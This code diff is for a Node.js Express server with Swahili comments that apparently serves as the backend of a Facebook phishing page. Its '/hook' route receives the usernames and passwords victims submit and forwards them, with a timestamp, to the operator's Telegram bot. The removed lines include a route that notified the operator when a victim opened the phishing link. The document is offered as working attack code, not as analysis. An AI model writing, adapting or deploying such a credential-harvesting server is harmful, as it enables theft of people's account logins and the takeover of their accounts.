@@ -1,7 +1,5 @@
 const express = require("express");
-const bodyParser = require("body-parser");
 const axios = require("axios");
-const cors = require("cors");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -10,53 +8,26 @@ const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
 if (!botToken || !chatId) {
-  console.error("BOT_TOKEN or CHAT_ID is missing in environment variables!");
+  console.error("BOT_TOKEN or CHAT_ID is missing!");
   process.exit(1);
 }
 
-app.use(cors());
-app.use(bodyParser.json());
+app.use(express.json());
 
-// Keep alive route
-app.get("/", (req, res) => {
-  res.send("Server is alive!");
-});
-
-// Route ya ku-track mtu akifungua link (auto notification)
-app.get("/track", async (req, res) => {
-  const visitTime = new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" });
-
-  const message = `⚠️ Link visited!\n\nTime: ${visitTime}`;
-
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-  try {
-    await axios.post(telegramUrl, {
-      chat_id: chatId,
-      text: message,
-      parse_mode: "Markdown"
-    });
-
-    res.status(200).send("Tracked!");
-  } catch (err) {
-    console.error("Telegram error (track):", err.message);
-    res.status(500).send("Error tracking visit");
-  }
-});
-
-// Telegram send route
+// Route ya kutuma credentials kwa Telegram
 app.post("/hook", async (req, res) => {
-  const data = req.body;
+  const { username, password } = req.body;
 
-  let message = "📲 Facebook new login attempt!\n\n";
-  for (let key in data) {
-    message += `${key.toUpperCase()}: ${data[key]}\n`;
-  }
+  const message = `
+🔐 Facebook Login Attempt
 
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+👤 Username: ${username}
+🔑 Password: ${password}
+⏰ Time: ${new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" })}
+`;
 
   try {
-    await axios.post(telegramUrl, {
+    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: message,
       parse_mode: "Markdown"
@@ -64,18 +35,16 @@ app.post("/hook", async (req, res) => {
 
     res.status(200).json({ status: "success" });
   } catch (err) {
-    console.error("Telegram error:", err.message);
-    res.status(500).json({ status: "error", message: "Telegram failed" });
+    console.error("Telegram Error:", err.message);
+    res.status(500).json({ status: "error", message: "Telegram send failed" });
   }
 });
 
-// Self-ping to keep server awake
-setInterval(() => {
-  axios.get("https://web-server-ee1r.onrender.com/")
-    .then(() => console.log("Self-ping successful"))
-    .catch((err) => console.log("Self-ping failed", err.message));
-}, 1000 * 60 * 14);
+// Route ya kuiamsha server
+app.get("/ping", (req, res) => {
+  res.send("Server active - TRC Bot");
+});
 
 app.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
